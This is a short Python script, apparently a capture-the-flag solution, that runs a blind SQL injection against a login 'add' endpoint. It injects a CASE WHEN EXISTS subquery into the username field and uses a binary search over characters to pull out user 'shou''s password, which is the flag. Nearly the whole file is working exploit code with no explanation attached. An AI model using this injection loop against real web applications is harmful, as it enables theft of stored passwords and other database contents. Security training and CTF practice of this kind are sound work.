import requests
import uuid


def check(payload):
    url = 'http://phish.sf.ctf.so/add'
    params = {'username': payload, 'password': ''}
    r = requests.post(url, data=params)

    if 'Err:' in r.text:
        return True
    else:
        return False


password = ''
index = 0
while True:
    index += 1
    try_cnt = 0
    low, high = 32, 126
    while(True):
        mid = (low + high) // 2
        char = chr(mid)

        try_cnt += 1

        if abs(high - low) <= 1:
            password += char
            print(password, try_cnt)
            if char == '}':
                exit()
            break
        sql = f"' || CASE WHEN EXISTS(SELECT * FROM user WHERE username = 'shou' AND SUBSTR(password, {index}, 1) < '{char}') THEN 'shou' ELSE '{str(uuid.uuid4())}' END);-- "

        if check(sql):
            high = mid
        else:
            low = mid
